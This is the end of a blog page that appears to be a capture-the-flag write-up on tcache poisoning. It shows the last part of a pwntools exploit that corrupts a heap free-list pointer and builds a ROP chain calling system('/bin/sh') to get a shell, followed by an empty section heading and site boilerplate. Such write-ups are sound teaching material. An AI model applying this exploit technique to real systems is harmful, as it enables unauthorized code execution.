again</span></span><br><span class="line">slot(<span class="number">5</span>)</span><br><span class="line">malloc(<span class="number">256</span>) <span class="comment"># slot 5 = 256</span></span><br><span class="line"></span><br><span class="line">slot(<span class="number">6</span>)</span><br><span class="line">malloc(<span class="number">256</span>) <span class="comment"># slot 6 = 256</span></span><br><span class="line"></span><br><span class="line">free() <span class="comment"># slot 6 freed</span></span><br><span class="line">slot(<span class="number">5</span>)</span><br><span class="line">free() <span class="comment"># slot 5 freed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite slot 0 to overwrite next ptr</span></span><br><span class="line">write(p64(rip))</span><br><span class="line"></span><br><span class="line">slot(<span class="number">7</span>)</span><br><span class="line">malloc(<span class="number">256</span>) <span class="comment"># getting to that next ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next 256 malloc will be arbitrary </span></span><br><span class="line">slot(<span class="number">8</span>)</span><br><span class="line">malloc(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write(p64(rdi+<span class="number">1</span>) + p64(rdi) + p64(sh) + p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Found-Memory"><a href="#Found-Memory" class="headerlink" title="Found Memory"></a>Found Memory</h2>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lost-Memory"><span class="toc-number">1.</span> <span class="toc-text">Lost Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">1.1.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Found-Memory"><span class="toc-number">2.</span> <span class="toc-text">Found Memory</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/tcache-poisoning/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/tcache-poisoning/&text=Lost &amp; Found Memory"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/tcache-poisoning/&is_video=false&description=Lost &amp; Found Memory"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Lost &amp; Found Memory&body=Check out this article: http://anthony-js.info/writeups/tcache-poisoning/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/tcache-poisoning/&title=Lost &amp; Found Memory"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/tcache-poisoning/&name=Lost &amp; Found Memory&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/tcache-poisoning/&t=Lost &amp; Found Memory"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2003-2025
    anthonyjs
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
